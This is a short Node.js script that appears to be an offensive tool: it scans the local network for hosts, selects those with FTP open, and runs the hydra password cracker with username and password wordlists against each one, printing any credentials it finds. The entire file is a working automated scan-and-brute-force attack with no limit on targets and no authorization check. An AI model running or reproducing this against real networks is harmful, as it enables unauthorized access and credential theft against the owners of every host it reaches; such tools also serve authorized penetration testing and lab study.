const { spawn } = require('child_process');
const { getHostIp, getOpenPorts, error } = require('./utils');

(async function scanNetwork () {
  const {
    ip,
    mask
  } = await getHostIp();
  const hosts = await getOpenPorts(ip, mask);
  process.stdout.write(`Found ${hosts.length} hosts on the network!\n`);
  const hostsWithTcpOpen = hosts.filter(e => e.ports.some(port => port.status === 'open' && port.service === 'ftp'))
  process.stdout.write(`Found ${hostsWithTcpOpen.length} hosts with open tcp ports!\n`);
  await Promise.all(hostsWithTcpOpen.map(host => bruteForceAttack('ftp', host.ip)))
})().catch(e => error(e.message));

async function bruteForceAttack (protocol, ip) {
  const hydra = spawn('hydra', ['-L', 'data/usernames.txt', '-P', 'data/passwords.txt', `${protocol}://${ip}`])
  hydra.stdout.pipe(process.stdout);
  hydra.stderr.pipe(process.stderr);
  hydra.stdout.on('data', data => {
    const match = data.toString().match(/login:.*password.*/);
    if (match) {
      process.stdout.write(`[${protocol}://${ip}] CREDENTIALS FOUND (${match[0]})`)
    }
  })
}
